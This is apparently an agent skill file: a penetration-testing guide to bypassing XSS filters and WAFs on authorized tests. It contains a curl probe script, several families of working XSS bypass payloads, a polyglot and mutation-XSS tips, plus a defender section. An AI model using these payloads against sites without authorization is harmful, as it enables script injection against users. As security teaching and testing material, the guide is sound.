---
name: xss-filter-bypass
description: Use when an XSS reflection point exists but input filters,
  sanitizers, or a WAF block naive payloads on an authorized test. Covers
  filter fingerprinting, encoding tricks, event-handler and tag smuggling,
  polyglots, and mutation-based bypasses. Use when script tags are stripped,
  when quotes or parentheses are blocked, when a WAF returns 403 on payloads,
  or when you must prove a filter is insufficient without noisy scanning.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: 2026-10-23
parent: web-xss
requires: [web-xss]
extends: []
relates: [web-sqli]
tools:
  - name: Burp Suite
    version: 2026.2
  - name: curl
    version: 8.5
  - name: Python
    version: 3.12
---

Filters try to make dangerous input safe by stripping tags, encoding
characters, or blocking keywords. Most hand-rolled filters fail because
browsers parse HTML in surprising ways. This skill covers systematic filter
bypass on authorized tests: fingerprinting exactly what the filter does,
then picking the bypass family that survives it. The rule is one change per
request, so you learn which transformation defeats the filter instead of
guessing.

## Quick Workflow

1. Confirm the reflection point and its context with a canary.
2. Fingerprint the filter: submit a probe alphabet of tags, attributes,
   quotes, and encodings, and record what survives.
3. Classify the filter: block-list of keywords, strip of tags, encoding of
   special characters, or length limit.
4. Pick the bypass family that matches the weakness, and test one variant
   at a time.
5. Confirm execution in a real browser with a harmless marker.
6. Document the exact filter behavior and the minimal working bypass.

## 1. Filter fingerprinting

```bash
# Probe alphabet: send each token and see what reflects
for token in '<script>' '<svg>' '<img' 'onerror' 'onload' '"' "'" '(' ')' ';' 'javascript:' 'alert'; do
  enc=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$token")
  out=$(curl -s "https://target.example/search?q=${enc}")
  if echo "$out" | grep -qF "$token"; then echo "PASS: $token"; else echo "BLOCKED: $token"; fi
done

# Check for case sensitivity in keyword blocks
for token in '<ScRiPt>' '<SCRIPT>'; do
  enc=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$token")
  curl -s "https://target.example/search?q=${enc}" | grep -qF "$token" && echo "PASS: $token"
done
```

Record the result table. The pattern of passes and blocks tells you the
filter family: case-sensitive block-list, tag stripper, or encoder.

## 2. Bypass families

```bash
# Family 1: keyword block-list is case sensitive -> change case
# <ScRiPt>alert(1)</ScRiPt>

# Family 2: single-pass stripper -> nest the keyword
# <scr<script>ipt> becomes <script> after one strip pass

# Family 3: parentheses blocked -> use template literals or throw
# <svg onload=alert`1`>
# <img src=x onerror=throw/**/1>

# Family 4: quotes blocked -> quote-free attributes and handlers
# <svg/onload=alert(1)>
# <body onload=alert(1)>

# Family 5: <script> blocked but events allowed -> handler vectors
# " autofocus onfocus=alert(1) x="
# <details open ontoggle=alert(1)>

# Family 6: encoding tricks for reflected-in-JS contexts
# <\/script> breaks out of a JS string inside a script block
```

Test one family at a time. When a family works, minimize the payload to the
shortest variant that still executes; short payloads survive length limits
and fit more contexts.

## 3. Polyglots for unknown contexts

When you cannot pin the exact context, a polyglot fires in several at once.

```bash
# Classic polyglot, works in HTML body, attribute, and JS string contexts
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

# Shorter modern polyglot for quick probing
'"><svg onload=alert(1)>
```

Use polyglots for discovery, then replace with the minimal context-specific
payload for the report. A polyglot in a report looks like guessing; a
minimal payload looks like understanding.

## Edge cases

- The filter strips on input but the render path decodes again. Your probe
  alphabet must be checked at the render point, not at the storage echo.
- Double encoding defeats the filter but the browser decodes once. Match
  your encoding depth to the application's decode depth exactly.
- Length limits truncate mid-payload. Split across multiple parameters
  that concatenate on the page, or use the shortest known vectors.
- The WAF blocks your IP after several blocks. Slow down, stay in the
  agreed window, and note the WAF behavior instead of hammering it.

## Escalation

- Every family fails: the filter may be a real sanitizer (DOMPurify with a
  strict config). Verify by checking whether obviously dangerous input
  like `<svg onload=alert(1)>` is neutralized at render; if it is, the
  filter holds and you move on.
- The bypass needs an unusual browser quirk: confirm in two browsers and
  note the version dependence; a quirk that works only in an old browser
  is a weaker finding.
- You suspect mutation XSS (mXSS): test by injecting into an `innerHTML`
  sink and reading back the serialized DOM; mXSS payloads change shape
  when the browser re-parses them, so check the DOM, not the source.

## Detection and defender view

Defenders see filter bypass attempts as varied, mutating payloads from one
source: case changes, nested tags, and encoding tricks in quick
succession. WAF logs capture the blocked variants, which is useful
intelligence about attacker creativity. Durable defense is context-aware
output encoding plus a maintained sanitizer allow-list, never a hand-rolled
block-list; every bypass family in this skill exists because a block-list
was trusted.

## Key references

- CWE-79 (Improper Neutralization of Input During Web Page Generation,
  Cross-site Scripting).
- OWASP XSS Filter Evasion Cheat Sheet.
- OWASP Testing Guide: Testing for Cross Site Scripting.
- PortSwigger Web Security Academy: XSS filter bypass labs.
